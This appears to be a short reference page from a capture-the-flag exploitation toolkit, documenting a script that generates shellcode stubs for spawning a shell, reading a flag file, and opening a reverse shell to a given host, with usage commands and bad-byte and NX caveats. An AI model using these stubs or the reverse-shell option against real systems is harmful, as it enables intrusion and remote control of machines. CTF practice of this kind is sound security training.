# tools/sc_gen.py — tested shellcode stubs

Emits tested shellcode stubs: execve64/execve86 (shell), cat64 (read /flag), rev64 (reverse shell). --raw for hex-only output; it reports any banned bytes present.

## Signals

| Observation | Meaning | Route |
|---|---|---|
| execve64/execve86 | system shell | the exec stubs |
| cat64 | cat a file (--path) | read flag |
| rev64 | reverse shell (--host/--port) | network shell |
| --raw | hex only | pipe into payloads |

## Steps

1. python3 tools/sc_gen.py execve64 --raw — the execve('/bin/sh') stub hex.
2. python3 tools/sc_gen.py cat64 --path /flag --raw — read the flag file.
3. python3 tools/sc_gen.py rev64 --host <h> --port <p> --raw — reverse shell.
4. The tool reports any \x00\x0a\x0d\x20 bytes the stub contains — match against your read's filter.

## Falsifier

Falsifier — NX is on: no shellcode executes; the stub is useless, go to ROP.

## Traps

- Only valid when NX is off — check pwn_triage.
- The stub must fit the bad-byte filter your read allows.
- cat64 needs the flag's real path — /flag, /flag.txt, or wherever the challenge puts it.

## Commands

```bash
python3 tools/sc_gen.py execve64 --raw
python3 tools/sc_gen.py cat64 --path /flag --raw
python3 tools/sc_gen.py --selftest
```

## Cross-references

`ret2shellcode.md` · `bad-chars.md`
